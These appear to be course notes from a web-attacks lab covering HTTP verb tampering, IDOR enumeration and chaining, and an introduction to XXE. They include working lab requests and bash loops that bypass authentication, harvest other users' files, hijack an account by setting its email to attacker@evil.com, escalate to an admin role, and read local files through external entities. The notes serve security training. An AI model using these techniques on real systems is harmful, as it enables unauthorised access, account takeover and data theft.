# Intro to HTTP Verb Tampering

HTTP requests start with a method (verb) that tells the server what action to perform. Common methods are GET and POST, but HTTP supports others like HEAD, PUT, DELETE, etc.

If a web server and application are configured to only allow GET and POST, sending other methods just causes an error (mostly harmless, aside from potential info disclosure).
However, if the server accepts more methods and the application isn’t built to handle them securely, attackers can exploit this to access hidden functions or bypass security.

| Verb        | Description                                       |
| ----------- | ------------------------------------------------- |
| **HEAD**    | Same as GET but returns only headers (no body)    |
| **PUT**     | Writes the request payload to a specific location |
| **DELETE**  | Deletes the resource at a specific location       |
| **OPTIONS** | Shows the methods supported by the server         |
| **PATCH**   | Makes partial changes to a resource               |


# Bypassing Basic Authentication

First, we intercept the request in Burp Suite.

The reset action uses a GET request:

<pre>GET /admin/reset.php HTTP/1.1
Host: SERVER_IP:PORT
...</pre>

- We try changing it to POST (Right-click → Change Request Method in Burp).
- Result: still prompted for login → server protects both GET and POST.
- Next, we test for other methods.
- A good candidate is HEAD, which works like GET but returns only headers (no body). Sometimes authentication is not applied to it, but the server still executes the function.

We first check what methods the server accepts:

`curl -i -X OPTIONS http://SERVER_IP:PORT/`

Response:

`Allow: POST,OPTIONS,HEAD,GET`

Since HEAD is allowed, we try it:

<pre>HEAD /admin/reset.php HTTP/1.1
Host: SERVER_IP:PORT
...</pre>

This time:

- No login prompt
- Empty output (normal for HEAD)
- Going back to the File Manager shows all files deleted

We successfully triggered the Reset without credentials.

# Bypassing Security Filters


The second — and more common — type of HTTP Verb Tampering comes from insecure coding.
This happens when a security filter only checks certain HTTP methods (e.g., only POST) and ignores others like GET, PUT, or PATCH.
For example, if a filter scans only $_POST['parameter'] for injections, switching the request to GET could bypass it.

**Identify**

In our File Manager web app, if we try to create a file with special characters (e.g., test;), we see:

Malicious Request Denied!

- This means the back end is filtering requests to block injection attempts.
- No matter what we try via the normal request, the filter blocks it.
- So we attempt HTTP Verb Tampering to see if another method bypasses the filter.

**Exploit**

Intercept the request in Burp Suite.

Use Change Request Method to switch to another method, like GET.

Example intercepted request:

<pre>GET /?filename=test%3B HTTP/1.1
Host: SERVER_IP:PORT
...</pre>

Result:

No "Malicious Request Denied!" message

The file test is created successfully


# Identifying IDORs

IDOR (Insecure Direct Object Reference) vulnerabilities appear when a web app exposes direct links or references to internal objects (files, IDs, database records) without proper access control.
To find them, we need to inspect HTTP requests for object references.

**1. URL Parameters & APIs**

Look for parameters like:

`?uid=1`
`?filename=file_1.pdf`
These often appear in URLs or API calls, but can also be in cookies or headers.

Basic testing:

- Change the number or filename (`uid=2`, `file_2.pdf`)
- Use fuzzing tools to try many variations
- Any unauthorized data returned → possible IDOR

**2. AJAX Calls**

Sometimes, front-end JavaScript contains hidden API endpoints.
Frameworks might load all functions on the client side and only “enable” certain ones based on role.
Even if you’re a normal user, the admin functions may still be in the code.

Example:

<pre>function changeUserPassword() {
    $.ajax({
        url: "change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success: function(result) {
            //
        }
    });
}</pre>

- Even if this function isn’t triggered in normal use, we can test it manually.
- If it works without proper access checks → IDOR.

**3. Hashing & Encoding References**

- Some apps encode or hash object references instead of using plain text IDs.
- If there’s no proper back-end access control, these can still be exploited.

Encoding example (Base64)

`?filename=ZmlsZV8xMjMucGRm`

- Decode: `file_123.pdf`
- Change: `file_124.pdf`
- Encode again and request it
- If the file is accessible → IDOR

**Hashing example (MD5)**

<pre>$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});</pre>

If we know the hash algorithm, we can hash other filenames (file_2.pdf) and try downloading them.

**4. Comparing User Roles**

- Create two accounts with different roles and compare their requests.
- Look for differences in API calls or object references.

Example (User1 API call):

<pre>{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"
  },
  "Id": "1",
  "Name": "User1"
}</pre>

If User2 can make the same request and get data → IDOR.

Even if we can’t calculate other users’ references, the fact that access control doesn’t verify ownership is a vulnerability.


# Mass IDOR Enumeration

Exploiting an IDOR can be simple or complex.

Once we spot a possible IDOR, we first try basic changes to see if other users’ data is accessible.

For more advanced exploitation, we need to understand:

- How the application creates object references
- How access control works
- How to automate requests for mass data retrieval

**Example: Insecure Parameters**

We have an Employee Manager app:

`http://SERVER_IP:PORT/`

We’re logged in as `uid=1`.

**Clicking Documents takes us to:**

`http://SERVER_IP:PORT/documents.php?uid=1`

**The files have predictable names:**

`/documents/Invoice_1_09_2021.pdf`
`/documents/Report_1_10_2021.pdf`

**The naming pattern uses:**

File type (Invoice/Report)
User ID (uid)
Date (month/year)

If the app uses the uid parameter directly without access control, changing it to `?uid=2` could expose another employee’s documents.

**Testing uid=2:**

`http://SERVER_IP:PORT/documents.php?uid=2`

The page looks the same at first glance, but checking the file links shows:

`/documents/Invoice_2_08_2020.pdf`
`/documents/Report_2_12_2020.pdf`

This confirms an IDOR — the uid parameter controls which user’s files are shown, with no back-end checks.

**Mass Enumeration**

Manually checking `uid=3`, `uid=4`, etc. is slow.
Instead, we can automate using curl + grep, a for loop, or tools like Burp Intruder/ZAP Fuzzer.

**Finding document links for a single UID:**

`curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"`

`/documents/Invoice_3_06_2020.pdf`
`/documents/Report_3_01_2020.pdf`

**Automating with Bash**

<pre>#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done</pre>

This loops through UIDs 1–10, finds PDF links, and downloads them — mass-exploiting the IDOR.

# Bypassing Encoded References

Sometimes, object references in an IDOR are encoded or hashed, making enumeration harder — but not impossible.

Example: Employee Contracts

**In the Employee Manager app:**

`http://SERVER_IP:PORT/contracts.php`

Clicking Employment_contract.pdf sends a POST request to:

<pre>/download.php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b</pre>

The contract parameter is an MD5 hash — we can’t directly decode it.

**Step 1 – Trying to Guess the Hash**

We try hashing common values (UID, username, filename):

`echo -n 1 | md5sum`

Result doesn’t match.
The value could be more complex (e.g., combined fields), so guessing would be hard.

**Step 2 – Discovering the Function**

Inspecting the page source reveals:

`javascript:downloadContract('1')`

The function:

<pre>javascript
Copy
Edit
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}</pre>

It base64-encodes the UID, then hashes it with MD5.

Example for UID=1:

`echo -n 1 | base64 -w 0 | md5sum`

`cdd96d3cc73d1dbdaffa03cc6cd7339b`

This matches the request — we’ve reversed the hashing process.

**Step 3 – Mass Enumeration**

We generate hashes for UIDs 1–10:

<pre>for i in {1..10}; do
    echo -n $i | base64 -w 0 | md5sum | tr -d ' -'
done</pre>

Sample output:

`cdd96d3cc73d1dbdaffa03cc6cd7339b`
`0b7e7dee87b1c3b98e72131173dfbbbf`
...

**Step 4 – Downloading All Contracts**


<pre>#!/bin/bash
for i in {1..10}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
done</pre>

Running it downloads all contracts:

contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
...


# IDOR in Insecure APIs

So far, we’ve used IDOR to access files and resources.
But IDOR can also exist in function calls and APIs, allowing actions as other users — e.g., changing their details, resetting passwords, or making purchases.

**Information Disclosure vs. Insecure Function Calls**

- IDOR Information Disclosure → lets us read other users’ data.
- IDOR Insecure Function Calls → lets us perform actions as other users.

Often, we can combine these: first leak info, then use it to attack API calls.

**Example: Editing a Profile**

In the Employee Manager app, clicking Edit Profile leads to:

`http://SERVER_IP:PORT/profile/index.php`

Form fields:

- Full Name
- Email
- About Me
  
**Updating the profile sends:**

`PUT /profile/api.php/profile/1`

With JSON data:

<pre>{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat..."
}</pre>

Security Weakness Observed
Role (role=employee) is stored client-side (cookie + JSON).
This could be manipulated if no server-side checks exist.
We need to know valid role names to escalate privileges.

**Exploitation Attempts**

1. Change UID to another user’s (`uid=2`)

Result: uid mismatch → back-end checks UID against API endpoint.

2 .Modify another user’s details

Change endpoint to `/profile/api.php/profile/2` and set `uid=2`.

Result: uuid mismatch → back-end checks UUID too.

3. Create a new user (POST request)

Result: Creating new employees is for admins only.

Delete a user (DELETE request)

Result: Deleting employees is for admins only.

4. Change role to admin

Without knowing valid role names → Invalid role.


# Chaining IDOR Vulnerabilities

Sometimes, IDOR information disclosure (reading other users’ data) can be combined with IDOR insecure function calls (modifying other users’ data) for powerful attacks.

**Step 1 – Information Disclosure**

When the profile page loads, it fetches user data with:

<pre>GET /profile/api.php
Cookie: role=employee</pre>

There’s no token-based or per-user access control — only the role cookie.

If we change the UID in the request:

`GET /profile/api.php/profile/2`

We get another user’s details:

<pre>{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation..."
}</pre>

Now we have their UUID, which we couldn’t guess before.

**Step 2 – Modifying Another User**

Using the leaked UUID, we send:

`PUT /profile/api.php/profile/2`

With modified details:

<pre>{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Changed Name",
    "email": "attacker@evil.com",
    "about": "..."
}</pre>

Result: No access control errors. Changes persist.

**Potential Attacks**

Change a user’s email → trigger password reset → take over account
Inject an XSS payload in “about” → execute when they view their profile

**Step 3 – Finding Admin Accounts**

We enumerate all users (scriptable) and find:

<pre>{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}</pre>

Now we know the admin role name: web_admin.

**Step 4 – Escalating Our Role**

Intercept the Update Profile request, change our role:

`"role": "web_admin"`

Result:

<pre>{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "..."
}</pre>

No “Invalid role” error → role changed successfully.


# Intro to XXE

**What is XML?**

XML (Extensible Markup Language) is a markup language (like HTML) used mainly for storing and transferring data, not for display.
XML documents have a root element and child elements.

- Tags: <date>
- Entities: Variables in XML (&lt; for <)
- Elements: Data between start and end tags (<date>01-01-2022</date>)
- Attributes: Extra info inside tags (version="1.0")
- Declaration: First line declaring version and encoding (<?xml version="1.0" encoding="UTF-8"?>)
- Special characters <, >, &, " must be replaced with entities (&lt;, &gt;, &amp;, &quot;).
- Comments: <!-- comment -->

**Example XML:**

<pre><?xml version="1.0" encoding="UTF-8"?><email><date>01-01-2022</date><time>10:00 am UTC</time><sender>john@inlanefreight.com</sender><recipients><to>HR@inlanefreight.com</to><cc><to>billing@inlanefreight.com</to><to>payslips@inlanefreight.com</to></cc></recipients><body>Hello, Kindly share with me the invoice...</body></email></pre>

**XML DTD (Document Type Definition)**

A DTD defines the allowed structure of an XML document.

**Example:**


<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>

Can be internal (inside the XML) or external (in a file like email.dtd).

**Example referencing an external file:**

<pre><?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd"></pre>

Example referencing via URL:

xml
Copy
Edit
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
XML Entities
Entities are variables in XML, defined in DTDs.

Internal Entity Example:

xml
Copy
Edit
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
Use in document: &company; → replaced with Inlane Freight.

External Entity Example (SYSTEM keyword):

xml
Copy
Edit
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
SYSTEM loads from a file path or URL.

PUBLIC can also be used for public resources.

When parsed server-side (e.g., SOAP APIs or form uploads), external entities can load local server files. If the file content is returned to the attacker, it can leak sensitive server data.

